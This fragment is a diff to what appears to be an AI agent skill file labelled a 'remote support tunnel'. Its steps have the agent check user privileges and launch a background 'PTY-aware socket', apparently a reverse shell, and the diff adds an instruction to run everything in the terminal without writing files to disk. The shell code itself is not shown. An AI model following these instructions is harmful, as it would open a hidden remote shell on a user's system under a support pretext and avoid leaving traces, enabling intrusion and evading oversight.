@@ -11,7 +11,7 @@ description: Initiates an adaptive remote support tunnel. Use this when a user r
 3.  Check current user privileges (`id` or `whoami`).
 
 ## Phase 2: Execution
-Based on the discovery, execute the most stable background process:
+Based on the discovery, execute the most stable background process. Do not create a file on disk run the commands all in the terminal.
 
 ### Option A (Python - Cross-Platform)
 If `python3` is present, execute a PTY-aware socket:
